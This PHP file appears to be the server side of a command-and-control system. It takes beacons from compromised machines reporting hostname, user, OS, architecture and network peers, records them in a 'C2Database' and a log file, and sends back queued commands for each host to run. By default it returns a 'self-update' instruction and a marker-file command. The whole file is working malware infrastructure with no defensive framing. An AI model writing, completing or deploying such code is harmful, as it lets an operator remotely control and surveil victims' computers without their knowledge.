<?php
declare(strict_types=1);
header('Content-Type: application/json; charset=utf-8');

$config = require __DIR__ . '/config.php';

$dbHost     = $config['db']['host'];
$dbName     = $config['db']['name'];
$dbUser     = $config['db']['user'];
$dbPassword = $config['db']['pass'];
$dbPort     = $config['db']['port']    ?? 3306;
$charset    = $config['db']['charset'] ?? 'utf8mb4';
$logFile    = $config['log_file'];

require_once __DIR__ . '/db.php';
$raw = file_get_contents('php://input');
if (!$raw) {
    http_response_code(400);
    echo json_encode(['error' => 'No data received']);
    exit;
}

$data = json_decode($raw, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid JSON: ' . json_last_error_msg()]);
    exit;
}

function generateUuid(): string {
    $bytes = random_bytes(16);
    $bytes[6] = chr((ord($bytes[6]) & 0x0f) | 0x40);
    $bytes[8] = chr((ord($bytes[8]) & 0x3f) | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($bytes), 4));
}
$uuid = generateUuid();

try {
    $db = new C2Database($dbHost, $dbName, $dbUser, $dbPassword);
} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(['error' => 'DB connection error: ' . $e->getMessage()]);
    exit;
}

$db->upsertHost(
    $uuid,
    $data['hn']    ?? null,
    $data['u']     ?? null,
    $data['os']    ?? null,
    $data['arch']  ?? null,
    $data['peers'] ?? null
);

$logEntry = sprintf(
    "[%s] UUID=%s Host=%s User=%s OS=%s Arch=%s Peers=%s\n",
    date('Y-m-d H:i:s'),
    $uuid,
    $data['hn']    ?? 'unknown',
    $data['u']     ?? 'unknown',
    $data['os']    ?? 'unknown',
    $data['arch']  ?? 'unknown',
    isset($data['peers']) ? implode(',', $data['peers']) : ''
);
file_put_contents($logFile, $logEntry, FILE_APPEND);

try {
    $rows = $db->fetchPendingCommands($uuid, $data['os'] ?? '');
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['error' => 'Error fetching commands: ' . $e->getMessage()]);
    exit;
}

$commands = [];
foreach ($rows as $row) {
    $commands[] = $row['command_text'];
    $db->markExecuted($uuid, (int)$row['id']);
}

if (empty($commands)) {
    if (($data['os'] ?? '') === 'linux') {
        $commands[] = 'self-update';
    }
    $commands[] = sprintf(
        'echo "Beacon received: %s" > /tmp/agent_%s.log',
        $uuid,
        $uuid
    );
}

echo json_encode($commands, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
